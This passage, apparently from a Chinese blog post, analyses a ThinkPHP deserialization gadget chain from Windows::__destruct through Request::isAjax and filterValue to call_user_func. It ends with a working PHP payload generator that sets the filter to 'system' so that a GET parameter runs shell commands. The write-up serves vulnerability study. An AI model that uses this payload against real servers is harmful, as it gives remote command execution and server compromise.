+</span><span style="color: #008080;">21</span>         <span style="color: #008000;">//</span><span style="color: #008000;"> 解析过滤器</span>
+<span style="color: #008080;">22</span>         <span style="color: #800080;">$filter</span> = <span style="color: #800080;">$this</span>-&gt;getFilter(<span style="color: #800080;">$filter</span>, <span style="color: #800080;">$default</span><span style="color: #000000;">);
+</span><span style="color: #008080;">23</span>         <span style="color: #0000ff;">if</span> (<span style="color: #008080;">is_array</span>(<span style="color: #800080;">$data</span><span style="color: #000000;">)) {
+</span><span style="color: #008080;">24</span>             <span style="color: #008080;">array_walk_recursive</span>(<span style="color: #800080;">$data</span>, [<span style="color: #800080;">$this</span>, 'filterValue'], <span style="color: #800080;">$filter</span><span style="color: #000000;">);
+</span><span style="color: #008080;">25</span>             <span style="color: #0000ff;">if</span> (<span style="color: #008080;">version_compare</span>(<span style="color: #ff00ff;">PHP_VERSION</span>, '7.1.0', '&lt;'<span style="color: #000000;">)) {
+</span><span style="color: #008080;">26</span>                 <span style="color: #008000;">//</span><span style="color: #008000;"> 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span>
+<span style="color: #008080;">27</span>                 <span style="color: #800080;">$this</span>-&gt;arrayReset(<span style="color: #800080;">$data</span><span style="color: #000000;">);
+</span><span style="color: #008080;">28</span> <span style="color: #000000;">            }
+</span><span style="color: #008080;">29</span>         } <span style="color: #0000ff;">else</span><span style="color: #000000;"> {
+</span><span style="color: #008080;">30</span>             <span style="color: #800080;">$this</span>-&gt;filterValue(<span style="color: #800080;">$data</span>, <span style="color: #800080;">$name</span>, <span style="color: #800080;">$filter</span><span style="color: #000000;">);
+</span><span style="color: #008080;">31</span> <span style="color: #000000;">        }
+</span><span style="color: #008080;">32</span>         . . .   . . . 
+<span style="color: #008080;">33</span>         <span style="color: #0000ff;">return</span> <span style="color: #800080;">$data</span><span style="color: #000000;">;
+</span><span style="color: #008080;">34</span>     }</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<src class="think-copy">复制代码
+<p>Request 类中的 param 函数调用了 input 函数，但同样参数不可控，再往上寻找调用点</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;"> 1</span> <span style="color: #0000ff;">public</span> <span style="color: #0000ff;">function</span> param(<span style="color: #800080;">$name</span> = '', <span style="color: #800080;">$default</span> = <span style="color: #0000ff;">null</span>, <span style="color: #800080;">$filter</span> = ''<span style="color: #000000;">)
+</span><span style="color: #008080;"> 2</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;"> 3</span>         . . .   . . .
+<span style="color: #008080;"> 4</span>         <span style="color: #0000ff;">if</span> (<span style="color: #0000ff;">true</span> === <span style="color: #800080;">$name</span><span style="color: #000000;">) {
+</span><span style="color: #008080;"> 5</span>             <span style="color: #008000;">//</span><span style="color: #008000;"> 获取包含文件上传信息的数组</span>
+<span style="color: #008080;"> 6</span>             <span style="color: #800080;">$file</span> = <span style="color: #800080;">$this</span>-&gt;<span style="color: #008080;">file</span><span style="color: #000000;">();
+</span><span style="color: #008080;"> 7</span>             <span style="color: #800080;">$data</span> = <span style="color: #008080;">is_array</span>(<span style="color: #800080;">$file</span>) ? <span style="color: #008080;">array_merge</span>(<span style="color: #800080;">$this</span>-&gt;param, <span style="color: #800080;">$file</span>) : <span style="color: #800080;">$this</span>-&gt;<span style="color: #000000;">param;
+</span><span style="color: #008080;"> 8</span>             <span style="color: #0000ff;">return</span> <span style="color: #800080;">$this</span>-&gt;input(<span style="color: #800080;">$data</span>, '', <span style="color: #800080;">$default</span>, <span style="color: #800080;">$filter</span><span style="color: #000000;">);
+</span><span style="color: #008080;"> 9</span> <span style="color: #000000;">        }
+</span><span style="color: #008080;">10</span>         <span style="color: #0000ff;">return</span> <span style="color: #800080;">$this</span>-&gt;input(<span style="color: #800080;">$this</span>-&gt;param, <span style="color: #800080;">$name</span>, <span style="color: #800080;">$default</span>, <span style="color: #800080;">$filter</span><span style="color: #000000;">);
+</span><span style="color: #008080;">11</span>     }</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<p>转到 isAjax 函数的定义</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;"> 1</span> <span style="color: #0000ff;">public</span> <span style="color: #0000ff;">function</span> isAjax(<span style="color: #800080;">$ajax</span> = <span style="color: #0000ff;">false</span><span style="color: #000000;">)
+</span><span style="color: #008080;"> 2</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;"> 3</span>         <span style="color: #800080;">$value</span>  = <span style="color: #800080;">$this</span>-&gt;server('HTTP_X_REQUESTED_WITH'<span style="color: #000000;">);
+</span><span style="color: #008080;"> 4</span>         <span style="color: #800080;">$result</span> = 'xmlhttprequest' == <span style="color: #008080;">strtolower</span>(<span style="color: #800080;">$value</span>) ? <span style="color: #0000ff;">true</span> : <span style="color: #0000ff;">false</span><span style="color: #000000;">;
+</span><span style="color: #008080;"> 5</span>         <span style="color: #0000ff;">if</span> (<span style="color: #0000ff;">true</span> === <span style="color: #800080;">$ajax</span><span style="color: #000000;">) {
+</span><span style="color: #008080;"> 6</span>             <span style="color: #0000ff;">return</span> <span style="color: #800080;">$result</span><span style="color: #000000;">;
+</span><span style="color: #008080;"> 7</span> <span style="color: #000000;">        }
+</span><span style="color: #008080;"> 8</span>         <span style="color: #800080;">$result</span>           = <span style="color: #800080;">$this</span>-&gt;param(<span style="color: #800080;">$this</span>-&gt;config['var_ajax']) ? <span style="color: #0000ff;">true</span> : <span style="color: #800080;">$result</span><span style="color: #000000;">;
+</span><span style="color: #008080;"> 9</span>         <span style="color: #800080;">$this</span>-&gt;mergeParam = <span style="color: #0000ff;">false</span><span style="color: #000000;">;
+</span><span style="color: #008080;">10</span>         <span style="color: #0000ff;">return</span> <span style="color: #800080;">$result</span><span style="color: #000000;">;
+</span><span style="color: #008080;">11</span>     }</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<p>这里 $ajax 参数没有对类型的限制，而且 param 的参数来自 $this-&gt;config，是可控的，param 在最后所调用的 input 函数的 $this-&gt;param, $name 就都可控跟进 get 和 route 函数不难发现 $this-&gt;param 的值来自 GET 请求</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;">1</span> <span style="color: #008000;">//</span><span style="color: #008000;"> 当前请求参数和URL地址中的参数合并</span>
+<span style="color: #008080;">2</span> <span style="color: #800080;">$this</span>-&gt;param = <span style="color: #008080;">array_merge</span>(<span style="color: #800080;">$this</span>-&gt;param, <span style="color: #800080;">$this</span>-&gt;get(<span style="color: #0000ff;">false</span>), <span style="color: #800080;">$vars</span>, <span style="color: #800080;">$this</span>-&gt;route(<span style="color: #0000ff;">false</span><span style="color: #000000;">));
+</span><span style="color: #008080;">3</span> <span style="color: #008000;">/*</span>
+<span style="color: #008080;">4</span> <span style="color: #008000;">http://127.0.0.1:9000/public/?test=pwd
+</span><span style="color: #008080;">5</span> <span style="color: #008000;">$this-&gt;param = array("test"=&gt;"pwd")
+</span><span style="color: #008080;">6</span> <span style="color: #008000;">*/</span></code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<p> 那么回到 input 函数看处理流程<br /><br />首先 $this-&gt;getData($data, $name) 得到 $data，跟进分析，返回 $data 为 $data[$val] 的值，即 $data[$name]</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;"> 1</span> <span style="color: #0000ff;">protected</span> <span style="color: #0000ff;">function</span> getData(<span style="color: #0000ff;">array</span> <span style="color: #800080;">$data</span>, <span style="color: #800080;">$name</span><span style="color: #000000;">)
+</span><span style="color: #008080;"> 2</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;"> 3</span>         <span style="color: #0000ff;">foreach</span> (<span style="color: #008080;">explode</span>('.', <span style="color: #800080;">$name</span>) <span style="color: #0000ff;">as</span> <span style="color: #800080;">$val</span><span style="color: #000000;">) {
+</span><span style="color: #008080;"> 4</span>             <span style="color: #0000ff;">if</span> (<span style="color: #0000ff;">isset</span>(<span style="color: #800080;">$data</span>[<span style="color: #800080;">$val</span><span style="color: #000000;">])) {
+</span><span style="color: #008080;"> 5</span>                 <span style="color: #800080;">$data</span> = <span style="color: #800080;">$data</span>[<span style="color: #800080;">$val</span><span style="color: #000000;">];
+</span><span style="color: #008080;"> 6</span>             } <span style="color: #0000ff;">else</span><span style="color: #000000;"> {
+</span><span style="color: #008080;"> 7</span>                 <span style="color: #0000ff;">return</span><span style="color: #000000;">;
+</span><span style="color: #008080;"> 8</span> <span style="color: #000000;">            }
+</span><span style="color: #008080;"> 9</span> <span style="color: #000000;">        }
+</span><span style="color: #008080;">10</span>         <span style="color: #0000ff;">return</span> <span style="color: #800080;">$data</span><span style="color: #000000;">;
+</span><span style="color: #008080;">11</span>     }</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<p>回到 input，接着处理 $filter = $this-&gt;getFilter($filter, $default);getFilter 的两个参数分别为 '' 和 null 且都不可控，但是跟进不难看出最后返回 $filter 的值就是 $this-&gt;filter，虽然后面 $filter[] = $default; 会给 filter 数组追加个值为 null 的元素，但后面 filterValue 中的 array_pop 函数正好给去掉了</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;"> 1</span> <span style="color: #0000ff;">protected</span> <span style="color: #0000ff;">function</span> getFilter(<span style="color: #800080;">$filter</span>, <span style="color: #800080;">$default</span><span style="color: #000000;">)
+</span><span style="color: #008080;"> 2</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;"> 3</span>         <span style="color: #0000ff;">if</span> (<span style="color: #008080;">is_null</span>(<span style="color: #800080;">$filter</span><span style="color: #000000;">)) {
+</span><span style="color: #008080;"> 4</span>             <span style="color: #800080;">$filter</span> =<span style="color: #000000;"> [];
+</span><span style="color: #008080;"> 5</span>         } <span style="color: #0000ff;">else</span><span style="color: #000000;"> {
+</span><span style="color: #008080;"> 6</span>             <span style="color: #800080;">$filter</span> = <span style="color: #800080;">$filter</span> ?: <span style="color: #800080;">$this</span>-&gt;<span style="color: #000000;">filter;
+</span><span style="color: #008080;"> 7</span>             <span style="color: #0000ff;">if</span> (<span style="color: #008080;">is_string</span>(<span style="color: #800080;">$filter</span>) &amp;&amp; <span style="color: #0000ff;">false</span> === <span style="color: #008080;">strpos</span>(<span style="color: #800080;">$filter</span>, '/'<span style="color: #000000;">)) {
+</span><span style="color: #008080;"> 8</span>                 <span style="color: #800080;">$filter</span> = <span style="color: #008080;">explode</span>(',', <span style="color: #800080;">$filter</span><span style="color: #000000;">);
+</span><span style="color: #008080;"> 9</span>             } <span style="color: #0000ff;">else</span><span style="color: #000000;"> {
+</span><span style="color: #008080;">10</span>                 <span style="color: #800080;">$filter</span> = (<span style="color: #0000ff;">array</span>) <span style="color: #800080;">$filter</span><span style="color: #000000;">;
+</span><span style="color: #008080;">11</span> <span style="color: #000000;">            }
+</span><span style="color: #008080;">12</span> <span style="color: #000000;">        }
+</span><span style="color: #008080;">13</span>         <span style="color: #800080;">$filter</span>[] = <span style="color: #800080;">$default</span><span style="color: #000000;">;
+</span><span style="color: #008080;">14</span>         <span style="color: #0000ff;">return</span> <span style="color: #800080;">$filter</span><span style="color: #000000;">;
+</span><span style="color: #008080;">15</span>     }</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<p> 这样就得到一条可控变量的函数调用链，最后执行命令<br /><br />下面简单梳理下流程 通过 Windows 类 __destruct() 方法调用到 file_exists 触发某类的 __toString() 来到 toArray() 函数 通过控制分别位于 Attribute 和 Conversion 的 $data 和 $append 变量执行在 Request 中不存在的 visible 函数进而触发其 __call() 在 Request 通过控制 $hook $filter $config 三个变量的值注入最终的 callback 名称和参数，再经这么一系列函数调用执行命令</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;">1</span> __call() ---&gt; <span style="color: #008080;">call_user_func_array</span>() ---&gt; isAjax() ---&gt; param() ---&gt; input() ---&gt; filterValue() ---&gt; <span style="color: #008080;">call_user_func</span>()</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<p> 构造 Payload<br /><br />由于 Model 类是 abstract 类型，无法实例化，而extends Model 的也只有一个 Pivot 类，所以就用它吧</p>
+<ol class="linenums">
+<li class="L0">
+<src class="cnblogs_code">
+<pre><code><span style="color: #008080;"> 1</span> &lt;?<span style="color: #000000;">php
+</span><span style="color: #008080;"> 2</span> <span style="color: #000000;">namespace think;
+</span><span style="color: #008080;"> 3</span> <span style="color: #0000ff;">abstract</span> <span style="color: #0000ff;">class</span><span style="color: #000000;"> Model
+</span><span style="color: #008080;"> 4</span> <span style="color: #000000;">{
+</span><span style="color: #008080;"> 5</span>     <span style="color: #0000ff;">protected</span> <span style="color: #800080;">$append</span> =<span style="color: #000000;"> [];
+</span><span style="color: #008080;"> 6</span>     <span style="color: #0000ff;">private</span> <span style="color: #800080;">$data</span> =<span style="color: #000000;"> [];
+</span><span style="color: #008080;"> 7</span>     <span style="color: #0000ff;">function</span><span style="color: #000000;"> __construct(){
+</span><span style="color: #008080;"> 8</span>         <span style="color: #800080;">$this</span>-&gt;append = ["a"=&gt;[""<span style="color: #000000;">]];
+</span><span style="color: #008080;"> 9</span>         <span style="color: #800080;">$this</span>-&gt;data = ["a"=&gt;<span style="color: #0000ff;">new</span><span style="color: #000000;"> Request()];
+</span><span style="color: #008080;">10</span> <span style="color: #000000;">    }
+</span><span style="color: #008080;">11</span> <span style="color: #000000;">}
+</span><span style="color: #008080;">12</span> <span style="color: #000000;">namespace think\model;
+</span><span style="color: #008080;">13</span> <span style="color: #0000ff;">use</span><span style="color: #000000;"> think\Model;
+</span><span style="color: #008080;">14</span> <span style="color: #0000ff;">class</span> Pivot <span style="color: #0000ff;">extends</span><span style="color: #000000;"> Model
+</span><span style="color: #008080;">15</span> <span style="color: #000000;">{
+</span><span style="color: #008080;">16</span> <span style="color: #000000;">}
+</span><span style="color: #008080;">17</span> <span style="color: #000000;">namespace think\process\pipes;
+</span><span style="color: #008080;">18</span> <span style="color: #0000ff;">use</span><span style="color: #000000;"> think\model\Pivot;
+</span><span style="color: #008080;">19</span> <span style="color: #0000ff;">class</span><span style="color: #000000;"> Windows
+</span><span style="color: #008080;">20</span> <span style="color: #000000;">{
+</span><span style="color: #008080;">21</span>     <span style="color: #0000ff;">private</span> <span style="color: #800080;">$files</span> =<span style="color: #000000;"> [];
+</span><span style="color: #008080;">22</span>     <span style="color: #0000ff;">public</span> <span style="color: #0000ff;">function</span><span style="color: #000000;"> __construct()
+</span><span style="color: #008080;">23</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;">24</span>         <span style="color: #800080;">$this</span>-&gt;files = [<span style="color: #0000ff;">new</span><span style="color: #000000;"> Pivot()];
+</span><span style="color: #008080;">25</span> <span style="color: #000000;">    }
+</span><span style="color: #008080;">26</span> <span style="color: #000000;">}
+</span><span style="color: #008080;">27</span> <span style="color: #000000;">namespace think;
+</span><span style="color: #008080;">28</span> <span style="color: #0000ff;">class</span><span style="color: #000000;"> Request
+</span><span style="color: #008080;">29</span> <span style="color: #000000;">{
+</span><span style="color: #008080;">30</span>     <span style="color: #0000ff;">protected</span> <span style="color: #800080;">$hook</span> =<span style="color: #000000;"> [];
+</span><span style="color: #008080;">31</span>     <span style="color: #0000ff;">protected</span> <span style="color: #800080;">$filter</span> = "system"<span style="color: #000000;">;
+</span><span style="color: #008080;">32</span>     <span style="color: #0000ff;">protected</span> <span style="color: #800080;">$config</span> =<span style="color: #000000;"> [
+</span><span style="color: #008080;">33</span>         <span style="color: #008000;">//</span><span style="color: #008000;"> 表单请求类型伪装变量</span>
+<span style="color: #008080;">34</span>         'var_method'       =&gt; '_method',
+<span style="color: #008080;">35</span>         <span style="color: #008000;">//</span><span style="color: #008000;"> 表单ajax伪装变量</span>
+<span style="color: #008080;">36</span>         'var_ajax'         =&gt; '_ajax',
+<span style="color: #008080;">37</span>         <span style="color: #008000;">//</span><span style="color: #008000;"> 表单pjax伪装变量</span>
+<span style="color: #008080;">38</span>         'var_pjax'         =&gt; '_pjax',
+<span style="color: #008080;">39</span>         <span style="color: #008000;">//</span><span style="color: #008000;"> PATHINFO变量名 用于兼容模式</span>
+<span style="color: #008080;">40</span>         'var_pathinfo'     =&gt; 's',
+<span style="color: #008080;">41</span>         <span style="color: #008000;">//</span><span style="color: #008000;"> 兼容PATH_INFO获取</span>
+<span style="color: #008080;">42</span>         'pathinfo_fetch'   =&gt; ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
+<span style="color: #008080;">43</span>         <span style="color: #008000;">//</span><span style="color: #008000;"> 默认全局过滤方法 用逗号分隔多个</span>
+<span style="color: #008080;">44</span>         'default_filter'   =&gt; '',
+<span style="color: #008080;">45</span>         <span style="color: #008000;">//</span><span style="color: #008000;"> 域名根，如thinkphp.cn</span>
+<span style="color: #008080;">46</span>         'url_domain_root'  =&gt; '',
+<span style="color: #008080;">47</span>         <span style="color: #008000;">//</span><span style="color: #008000;"> HTTPS代理标识</span>
+<span style="color: #008080;">48</span>         'https_agent_name' =&gt; '',
+<span style="color: #008080;">49</span>         <span style="color: #008000;">//</span><span style="color: #008000;"> IP代理获取标识</span>
+<span style="color: #008080;">50</span>         'http_agent_ip'    =&gt; 'HTTP_X_REAL_IP',
+<span style="color: #008080;">51</span>         <span style="color: #008000;">//</span><span style="color: #008000;"> URL伪静态后缀</span>
+<span style="color: #008080;">52</span>         'url_html_suffix'  =&gt; 'html',
+<span style="color: #008080;">53</span> <span style="color: #000000;">    ];
+</span><span style="color: #008080;">54</span>     <span style="color: #0000ff;">function</span><span style="color: #000000;"> __construct(){
+</span><span style="color: #008080;">55</span>         <span style="color: #800080;">$this</span>-&gt;filter = "system"<span style="color: #000000;">;
+</span><span style="color: #008080;">56</span>         <span style="color: #800080;">$this</span>-&gt;config = ["var_ajax"=&gt;''<span style="color: #000000;">];
+</span><span style="color: #008080;">57</span>         <span style="color: #800080;">$this</span>-&gt;hook = ["visible"=&gt;[<span style="color: #800080;">$this</span>,"isAjax"<span style="color: #000000;">]];
+</span><span style="color: #008080;">58</span> <span style="color: #000000;">    }
+</span><span style="color: #008080;">59</span> <span style="color: #000000;">}
+</span><span style="color: #008080;">60</span> <span style="color: #0000ff;">use</span><span style="color: #000000;"> think\process\pipes\Windows;
+</span><span style="color: #008080;">61</span> <span style="color: #0000ff;">echo</span> <span style="color: #008080;">base64_encode</span>(<span style="color: #008080;">serialize</span>(<span style="color: #0000ff;">new</span> Windows()));</code></pre>
+
+<p>&nbsp;</p>
+</li>
+</ol>
+<p> 自己先构造一个利用点反序列化我们的内容，生成好 payload，GET 传入要执行的命令，命令别忘了 urlencode<br /><br />查看调用堆栈</p>
+
+</div></div><hr><script charset='utf-8' src='../../js/sming.js'></script></body></html>
